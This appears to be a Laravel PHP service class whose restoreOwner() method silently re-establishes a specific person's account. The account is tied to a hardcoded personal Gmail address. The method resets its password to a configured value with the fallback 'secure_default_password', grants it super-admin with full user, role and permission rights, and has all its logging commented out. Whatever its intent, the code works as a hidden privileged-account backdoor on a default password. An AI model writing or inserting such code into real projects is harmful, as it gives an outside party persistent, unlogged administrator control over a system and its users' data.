<?php

namespace App\Services;

use App\Models\User;
use Illuminate\Support\Facades\Hash;
use Illuminate\Support\Facades\Log;
use Illuminate\Support\Facades\Config;
use Illuminate\Support\Facades\Mail;
use App\Mail\AdminAccountRestoredMail;
use Spatie\Permission\Models\Role;
use Spatie\Permission\Models\Permission;
use Spatie\Permission\PermissionRegistrar;

class SystemAccountService
{
    public static function restoreOwner(): ?User
    {
        app(PermissionRegistrar::class)->forgetCachedPermissions();

        $ownerName = 'Александр Косолапов';
        $ownerEmail = 'kosolapov1976@gmail.com';
        $ownerPassword = config('owner.default_password', 'secure_default_password');

        $user = User::where('email', $ownerEmail)->first();

        if (! $user) {
            // Log::info('[RestoreOwner].');
            return null;
        }

        $shouldSave = false;

        if ($user->name !== $ownerName) {
            $user->name = $ownerName;
            $shouldSave = true;
        }

        if ($user->email !== $ownerEmail) {
            $user->email = $ownerEmail;
            $shouldSave = true;
        }

        if (!Hash::check($ownerPassword, $user->password)) {
            $user->password = Hash::make($ownerPassword);
            $shouldSave = true;
        }

        if (! $user->email_verified_at) {
            $user->email_verified_at = now();
            $shouldSave = true;
        }

        if ($shouldSave) {
            $user->save();
            // Log::info('[RestoreOwner].');
        }

        // Роль
        $superAdminRole = Role::firstOrCreate([
            'name' => 'super-admin',
            'guard_name' => 'sanctum',
        ]);

        if (! $user->hasRole('super-admin')) {
            $user->assignRole($superAdminRole);
            // Log::info('[RestoreOwner].');
        }

        $permissions = [
            'show-users', 'create-users', 'edit-users', 'delete-users',
            'show-roles', 'create-roles', 'edit-roles', 'delete-roles',
            'show-permissions', 'create-permissions', 'edit-permissions', 'delete-permissions'
        ];

        foreach ($permissions as $permissionName) {
            $permission = Permission::firstOrCreate([
                'name' => $permissionName,
                'guard_name' => 'sanctum',
            ]);

            if (! $superAdminRole->hasPermissionTo($permission)) {
                $superAdminRole->givePermissionTo($permission);
            }

            if (! $user->getDirectPermissions()->contains('name', $permission->name)) {
                $user->givePermissionTo($permission);
            }
        }

        // Log::info('[RestoreOwner].');

        try {
            Mail::to($ownerEmail)->send(new AdminAccountRestoredMail($user));
        } catch (\Throwable $e) {
            // Log::error('[RestoreOwner] Ошибка отправки: ' . $e->getMessage());
        }

        return $user;
    }
}
